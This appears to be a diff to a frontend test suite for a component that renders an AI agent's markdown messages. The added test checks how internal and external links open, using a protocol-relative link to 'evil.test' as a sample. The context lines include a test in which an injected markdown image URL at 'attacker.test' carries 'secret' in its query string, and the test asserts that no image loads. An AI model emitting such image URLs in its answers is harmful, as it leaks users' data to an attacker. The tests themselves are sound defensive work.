@@ -76,6 +76,27 @@ describe("AgentMessage", () => {
     expect(nrc.getAttribute("rel")).toContain("noopener");
   });
 
+  it("opens links to app pages in the app, and everything else in a new tab", () => {
+    renderMessage(
+      answer([
+        {
+          type: "text",
+          text:
+            "### Sudan\n\n- **[El Obeid](/event/ev_1)**: drone strike. See [Sudan on the Map](/map?countryId=loc1&x=1), " +
+            "[admin](/admin) and [evil](//evil.test/event/ev_1).",
+        },
+      ]),
+    );
+    expect(screen.getByRole("heading", { name: "Sudan" })).toBeInTheDocument();
+    const event = screen.getByRole("link", { name: "El Obeid" });
+    expect(event).toHaveAttribute("href", "/event/ev_1");
+    expect(event).not.toHaveAttribute("target");
+    expect(screen.getByRole("link", { name: "Sudan on the Map" })).toHaveAttribute("href", "/map?countryId=loc1");
+    expect(screen.getAllByTestId("agent-app-link")).toHaveLength(2);
+    expect(screen.getByRole("link", { name: "admin" })).toHaveAttribute("target", "_blank");
+    expect(screen.getByRole("link", { name: "evil" })).toHaveAttribute("target", "_blank");
+  });
+
   it("never loads an image, so an injected image URL can't leak anything", () => {
     const { container } = renderMessage(
       answer([{ type: "text", text: "See ![chart of access](https://attacker.test/x?q=secret) here." }]),
